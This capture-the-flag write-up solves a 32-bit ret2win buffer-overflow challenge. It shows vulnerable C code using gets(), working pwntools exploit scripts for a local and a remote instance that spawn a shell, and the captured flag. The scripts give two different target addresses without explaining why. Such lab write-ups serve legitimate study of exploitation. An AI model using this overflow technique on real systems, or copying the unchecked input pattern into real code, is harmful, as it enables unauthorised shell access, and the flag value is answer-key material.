


-----

We are given two files, `babybufov.c` and `babybufov`.

```c
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

From the above, `main()`  makes a call `vuln()` which allocates a buffer, `buf`, of length 16. The `gets()` method is then called to allocate data to `buf` based on user input. 

This is a classic [Ret2Win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win) binary exploitation challenge with the goal being to exploit a vulnerability within the binary and call an uninvoked function. In this case, our uninvoked function is `target()` which executes `/bin/bash` when it is called.

Fuzzing the program, we get it to crash at **24 bytes**.

Running `objdump` on the program, we get `0x080491a6` as the address for the `target` function. We can therefore create our local exploit:

```python
from pwn import *

# Set up pwntools for the correct architecture
context(arch='i386', os='linux')

# Load the binary
elf = ELF('./babybufov')

# Start the process
p = process('./babybufov')

# Address of 'target' function
target_address = 0x080491a6

# Offset to reach EIP
offset = 24 + 4

# Create the payload
padding = b'A' * offset  # Adjusting to 24 bytes to test overflow beyond buffer
payload = padding + p32(target_address)  # Overwrite return address with 'target' function address

print(payload)
print(p32(target_address))

# Send the payload
p.recvuntil(b'Gimme some data!')  # Wait for the prompt
p.sendline(payload)  # Send the payload to overflow

# Drop into an interactive shell
p.interactive()
```

![[huntress/2024/images/Pasted image 20241017125529.png]]

We can edit our script to run against the provided instance to retrieve the flag:

```python
from pwn import *

# Set up pwntools for the correct architecture
context(arch='i386', os='linux')

# Load the binary
elf = ELF('./babybufov')

# Start the process
p = remote('challenge.ctf.games', 31194)    # remote

# Address of 'target' function
target_address = 0x80491f6

# Offset to reach EIP
offset = 24 + 4

# Create the payload
padding = b'A' * offset  # Adjusting to 24 bytes to test overflow beyond buffer
payload = padding + p32(target_address)  # Overwrite return address with 'target' function address

print(payload)
print(p32(target_address))

# Send the payload
p.recvuntil(b'Gimme some data!')  # Wait for the prompt
p.sendline(payload)  # Send the payload to overflow

# Drop into an interactive shell
p.interactive()

```

```console
$ python3 exploit.py

...
Jackpot!
$ cat flag
flag{4cd3b4079393e861af489ca063373f98}
```